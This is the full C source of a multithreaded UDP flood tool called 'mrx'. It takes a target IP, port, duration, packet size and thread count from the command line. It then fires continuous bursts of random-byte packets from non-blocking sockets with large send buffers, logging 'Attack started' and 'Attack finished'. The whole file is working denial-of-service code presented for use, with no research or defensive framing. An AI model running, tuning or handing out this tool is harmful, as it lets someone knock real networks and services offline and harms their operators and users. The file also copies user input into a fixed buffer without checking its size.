#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

void usage();
void *send_smart_packets(void *arg);

void usage() {
    fprintf(stderr, "Usage: ./mrx [IP] [PORT] [TIME] [PACKET_SIZE] [THREAD_COUNT]\n");
    exit(EXIT_FAILURE);
}

void *send_smart_packets(void *arg) {
    int sockfd;
    struct sockaddr_in servaddr;
    char packet_data[65535];
    time_t start_time = time(NULL);

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        pthread_exit(NULL);
    }

    int broadcast = 1;
    int sndbuf = 100 * 1024 * 1024;
    setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof(broadcast));
    fcntl(sockfd, F_SETFL, O_NONBLOCK);

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(TARGET_PORT);
    servaddr.sin_addr.s_addr = inet_addr(TARGET_IP);

    for (int i = 0; i < PACKET_SIZE; i++) {
        packet_data[i] = (char)(rand() % 256);
    }

    while (time(NULL) - start_time < DURATION_TIME) {
        for (int mega_burst = 0; mega_burst < 60; mega_burst++) {
            sendto(sockfd, packet_data, PACKET_SIZE, MSG_DONTWAIT,
                   (const struct sockaddr *)&servaddr, sizeof(servaddr));
            
            for (int i = 0; i < 30; i++) {
                sendto(sockfd, packet_data, PACKET_SIZE, MSG_DONTWAIT,
                       (const struct sockaddr *)&servaddr, sizeof(servaddr));
            }
            
            for (int extra = 0; extra < 6; extra++) {
                sendto(sockfd, packet_data, PACKET_SIZE, MSG_DONTWAIT,
                       (const struct sockaddr *)&servaddr, sizeof(servaddr));
            }
        }
    }

    close(sockfd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        usage();
    }

    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);

    if (TARGET_PORT <= 0 || DURATION_TIME <= 0 || PACKET_SIZE <= 0 || THREAD_COUNT <= 0) {
        fprintf(stderr, "Error: Invalid argument values\n");
        usage();
    }

    printf("Attack started: %s:%d for %d seconds with %d threads, %d bytes\n", TARGET_IP, TARGET_PORT, DURATION_TIME, THREAD_COUNT, PACKET_SIZE);
    fflush(stdout);

    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    if (threads == NULL) {
        fprintf(stderr, "Memory allocation failed for thread IDs\n");
        return EXIT_FAILURE;
    }

    srand(time(NULL));

    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, send_smart_packets, NULL) != 0) {
            fprintf(stderr, "Warning: Failed to create thread %d\n", i);
            break;
        }
    }

    for (int j = 0; j < THREAD_COUNT; j++) {
        pthread_join(threads[j], NULL);
    }

    free(threads);
    
    printf("Attack finished\n");
    fflush(stdout);

    return 0;
}